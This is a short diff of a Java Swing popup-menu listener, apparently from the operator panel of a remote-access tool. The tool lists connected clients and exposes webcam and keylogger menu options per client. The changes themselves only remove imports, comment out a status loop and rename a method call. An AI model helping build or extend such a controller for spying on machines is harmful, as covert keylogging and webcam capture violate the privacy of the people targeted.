@@ -1,7 +1,6 @@
 package GUI.TableUtils.Configuration;
 
 import Connections.Client;
-import Connections.ClientHandler;
 import Connections.GetSYS;
 import GUI.SplinterGUI;
 import GUI.Main;
@@ -25,7 +24,6 @@ import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
-import java.util.Map;
 import java.util.Objects;
 
 public class TablePopUpListener extends MouseAdapter {
@@ -54,10 +52,10 @@ public class TablePopUpListener extends MouseAdapter {
         javax.swing.table.TableModel tableModel = Main.gui.getConnectionsTable().getModel();
         int row = Main.gui.getConnectionsTable().getSelectedRow();
         String UUID = (String) mainGUI.getConnectionsDefaultTableModel().getValueAt(row, 0);
-        for (Map.Entry<String, ClientHandler> entry : Main.server.getMap().entrySet())
+       /* for (Map.Entry<String, ClientHandler> entry : Main.server.getMap().entrySet())
             if ((UUID).equals(entry.getKey())) {
                 mainGUI.getConnectionsDefaultTableModel().setValueAt("Connected", row, tableModel.getColumnCount() - 1);
-            }
+            }*/
     }
 
     public static void setIconToMenuItem(JMenuItem item, String path) {
@@ -160,7 +158,7 @@ public class TablePopUpListener extends MouseAdapter {
             DefaultTableModel defaultTableModel = mainGUI.getConnectionsDefaultTableModel();
             if (defaultTableModel.getValueAt(row, defaultTableModel.getColumnCount() - 1).equals("Connected")) {
                 connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
-                Client client = GetSYS.getClientHandlerV2();
+                Client client = GetSYS.getClientHandler();
                 assert client != null;
                 webcamMenu.setVisible(client.getSysInfo().WEBCAM());
                 keyloggerMenuOptions.setVisible(client.getSysInfo().KEYLOGGER());
